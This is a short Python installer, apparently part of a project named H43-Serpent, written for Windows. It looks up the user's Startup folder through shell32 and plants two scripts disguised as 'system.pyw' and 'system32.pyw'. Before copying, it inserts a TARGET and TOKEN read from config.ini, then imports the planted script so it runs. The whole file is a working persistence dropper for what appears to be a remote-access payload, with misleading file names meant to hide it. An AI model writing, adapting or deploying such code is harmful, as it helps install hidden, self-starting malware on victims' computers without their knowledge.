'''
Author: Fytex
REPO: https://github.com/Fytex/H43-Serpent
'''


import os
import sys
import pip
import ctypes
import shutil
import importlib
import configparser


from ctypes import wintypes

MAIN = 'system'
LIB = 'system32'

SCRIPTS_FOLDER = 'scripts\\'
MAIN_SCRIPT_NAME = MAIN + '.pyw'
LIB_SCRIPT_NAME = LIB + '.pyw'



# Define constants used by the SHGetFolderPath function
CSIDL_STARTMENU = 7
SHGFP_TYPE_CURRENT = 0

# Load the shell32.dll library
shell32 = ctypes.WinDLL('shell32')

# Define the SHGetFolderPath function signature
SHGetFolderPath = shell32.SHGetFolderPathW
SHGetFolderPath.argtypes = [
    wintypes.HWND,
    ctypes.c_int,
    wintypes.HANDLE,
    wintypes.DWORD,
    wintypes.LPWSTR
]

# Call the SHGetFolderPath function to get the path to the Start Menu folder
path_buf = ctypes.create_unicode_buffer(wintypes.MAX_PATH)
result = SHGetFolderPath(None, CSIDL_STARTMENU, None, SHGFP_TYPE_CURRENT, path_buf)

if result != 0:
    print('Couldn\'t find Start Menu')
    exit()

#d = os.environ['AppData'] + r"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
d = path_buf.value + '\\'


config = configparser.ConfigParser()
config.read('config.ini')
TARGET = config['CONFIGS']['TARGET']
TOKEN = config['CONFIGS']['TOKEN']


replacement_line = f'TARGET = \'{TARGET}\'\nTOKEN = \'{TOKEN}\'\nLIB = \'{LIB}\'\n'


with open(SCRIPTS_FOLDER + MAIN_SCRIPT_NAME) as from_file:
    for _ in range(3):
       from_file.readline()
       
    with open(d + MAIN_SCRIPT_NAME, 'w') as to_file:
        to_file.write(replacement_line)
        shutil.copyfileobj(from_file, to_file)
        
shutil.copyfile(SCRIPTS_FOLDER + LIB_SCRIPT_NAME, d + LIB_SCRIPT_NAME)

os.chdir(d)
sys.path.insert(0, d)

importlib.import_module(MAIN_SCRIPT_NAME)



